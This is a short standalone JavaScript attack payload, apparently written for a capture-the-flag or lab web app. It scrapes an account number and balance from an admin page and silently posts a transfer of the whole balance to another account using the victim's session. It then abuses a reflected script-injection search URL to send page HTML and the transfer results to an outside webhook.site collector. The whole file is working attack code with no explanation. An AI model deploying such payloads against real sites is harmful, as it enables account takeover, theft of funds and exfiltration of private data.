fetch('/radrovers/admin').then(r=>r.text()).then(t=>{
  var m = t.match(/<option value="([A-Z]{2}-\d{4}-\d{4}-\d{4})">[^<]*\((\d+) caps\)/);
  if(!m){ window.location='/wastelandwonders/search?query=%3Cscript%3Efetch(%22https://webhook.site/14a8d1cb-438a-4891-aa70-1b1b1c32a3c1/q3nomatch%22,{method:%22POST%22,body:document.body.outerHTML.slice(0,2000),mode:%22no-cors%22}).then(()=>{})%3C/script%3E'; return; }
  var from=m[1], amt=m[2];
  var fd='from_account='+encodeURIComponent(from)+'&to_account=XX-1111-2222-3333&amount='+amt;
  fetch('/radrovers/transfer',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:fd,credentials:'same-origin'}).then(()=>{
    fetch('/radrovers/admin').then(r=>r.text()).then(t2=>{
      var bm=t2.match(/<td class="text-end[^>]*>\s*(\d+)/);
      var bal = bm?bm[1]:'NA';
      window.location='/wastelandwonders/search?query=%3Cscript%3Efetch(%22https://webhook.site/14a8d1cb-438a-4891-aa70-1b1b1c32a3c1/q3result?from='+from+'%26amt='+amt+'%26balance='+bal+'%22).then(()=>{})%3C/script%3E';
    });
  });
});
